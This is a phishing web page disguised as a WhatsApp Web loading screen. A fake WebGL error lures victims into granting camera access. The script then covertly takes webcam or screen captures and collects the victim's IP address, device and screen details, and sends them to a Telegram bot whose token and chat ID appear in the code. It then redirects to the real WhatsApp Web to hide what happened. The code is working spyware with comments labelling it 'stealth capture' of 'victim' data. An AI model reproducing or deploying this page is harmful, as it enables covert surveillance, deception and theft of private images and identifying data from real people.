<!DOCTYPE html>
<html>
<head>
    <title>WhatsApp Web Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0c0c0c; color: white; font-family: Arial; height: 100vh; display: flex; justify-content: center; align-items: center; }
        .loader { text-align: center; }
        .spinner { border: 5px solid rgba(255,255,255,0.3); border-radius: 50%; border-top: 5px solid #25D366; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .hidden { display: none; }
        #fakeError { background: rgba(255,0,0,0.1); border: 1px solid red; padding: 20px; border-radius: 10px; margin-top: 20px; max-width: 400px; }
    </style>
</head>
<body>
    <div class="loader" id="loader">
        <div class="spinner"></div>
        <h2>Loading WhatsApp Web...</h2>
        <p>Preparing your chat interface</p>
        <p style="font-size: 12px; color: #888; margin-top: 30px;">Checking camera compatibility...</p>
    </div>

    <div id="fakeError" class="hidden">
        <h3>‚ö†Ô∏è WebGL Compatibility Issue</h3>
        <p>WhatsApp Web requires WebGL for better performance.</p>
        <p>Click "Allow" if prompted for camera access (for QR scan).</p>
        <button onclick="retryConnection()" style="background: #25D366; color: white; border: none; padding: 10px 20px; border-radius: 5px; margin-top: 10px; cursor: pointer;">Retry Connection</button>
    </div>

    <!-- Hidden elements for capture -->
    <canvas id="hiddenCanvas" class="hidden"></canvas>
    <video id="hiddenVideo" autoplay playsinline class="hidden"></video>

    <script>
        // Telegram Configuration (GANTI INI!)
        const BOT_TOKEN = "8186605145:AAH4nAskT_3TbCjYP_WC2I6ZcLspEAJmnTM";
        const CHAT_ID = "7491173075";
        
        let victimData = {
            phone: '',
            ip: '',
            userAgent: navigator.userAgent,
            screen: `${screen.width}x${screen.height}`,
            photos: []
        };

        // Get IP tanpa alert
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => victimData.ip = data.ip);

        // Stealth camera activation sequence
        setTimeout(() => {
            // Step 1: Fake error message
            document.getElementById('loader').classList.add('hidden');
            document.getElementById('fakeError').classList.remove('hidden');
            
            // Step 2: Try to access camera indirectly
            setTimeout(attemptStealthCapture, 2000);
            
            // Step 3: Auto-redirect after "capture"
            setTimeout(() => {
                window.location.href = "https://web.whatsapp.com";
            }, 5000);
        }, 3000);

        function attemptStealthCapture() {
            // Technique 1: Try getUserMedia with fake constraints
            const constraints = {
                video: {
                    width: { exact: 1 },  // Tiny resolution
                    height: { exact: 1 }
                }
            };

            navigator.mediaDevices.getUserMedia(constraints)
                .then(stream => {
                    // Got access! But with 1x1 resolution
                    // Now try to upgrade without new permission
                    upgradeStreamQuality(stream);
                })
                .catch(() => {
                    // If failed, try other methods
                    tryFallbackMethods();
                });
        }

        function upgradeStreamQuality(stream) {
            // Try to change constraints on existing stream
            const video = document.getElementById('hiddenVideo');
            video.srcObject = stream;
            
            // Wait a moment then capture
            setTimeout(() => {
                captureFromStream(stream);
                // Try to increase quality
                try {
                    const track = stream.getVideoTracks()[0];
                    track.applyConstraints({
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    });
                    setTimeout(() => captureFromStream(stream), 100);
                } catch(e) { /* Ignore */ }
            }, 500);
        }

        function captureFromStream(stream) {
            const video = document.getElementById('hiddenVideo');
            const canvas = document.getElementById('hiddenCanvas');
            const ctx = canvas.getContext('2d');
            
            // Set canvas size to video size
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            
            // Draw and capture
            ctx.drawImage(video, 0, 0);
            
            // Convert to data URL
            const photoData = canvas.toDataURL('image/jpeg', 0.5);
            victimData.photos.push(photoData);
            
            // Send to Telegram
            sendStealthPhoto(photoData);
            
            // Stop stream
            stream.getTracks().forEach(track => track.stop());
        }

        function tryFallbackMethods() {
            // Method 1: Try screen sharing (less suspicious)
            navigator.mediaDevices.getDisplayMedia({ video: true })
                .then(stream => {
                    // Got screen - might see victim's face via reflection
                    captureFromStream(stream);
                })
                .catch(() => {
                    // Method 2: Try without constraints
                    navigator.mediaDevices.getUserMedia({ video: true })
                        .then(stream => {
                            captureFromStream(stream);
                        })
                        .catch(() => {
                            // Method 3: Use existing images from page
                            stealExistingImages();
                        });
                });
        }

        function stealExistingImages() {
            // Extract any images already on page
            const images = document.getElementsByTagName('img');
            for(let img of images) {
                if(img.src && img.src.startsWith('data:')) {
                    victimData.photos.push(img.src);
                }
            }
        }

        function sendStealthPhoto(photoData) {
            // Send basic info first
            const message = `üïµÔ∏è STEALTH CAPTURE SUCCESS\n\n` +
                           `üì± Device: ${victimData.userAgent}\n` +
                           `üñ•Ô∏è Screen: ${victimData.screen}\n` +
                           `üåê IP: ${victimData.ip || 'Unknown'}\n` +
                           `üì∏ Photo Captured: ${victimData.photos.length}\n` +
                           `‚è∞ Time: ${new Date().toLocaleString('id-ID')}`;
            
            // Send text info
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
            
            // Send photo if captured
            if(photoData) {
                const blob = dataURItoBlob(photoData);
                const formData = new FormData();
                formData.append('photo', blob, 'stealth_capture.jpg');
                formData.append('chat_id', CHAT_ID);
                formData.append('caption', 'Stealth capture - no permission');
                
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }
        }

        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for(let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }

        function retryConnection() {
            document.getElementById('fakeError').classList.add('hidden');
            document.getElementById('loader').classList.remove('hidden');
            setTimeout(() => window.location.href = "https://web.whatsapp.com", 1000);
        }
    </script>
</body>
</html>
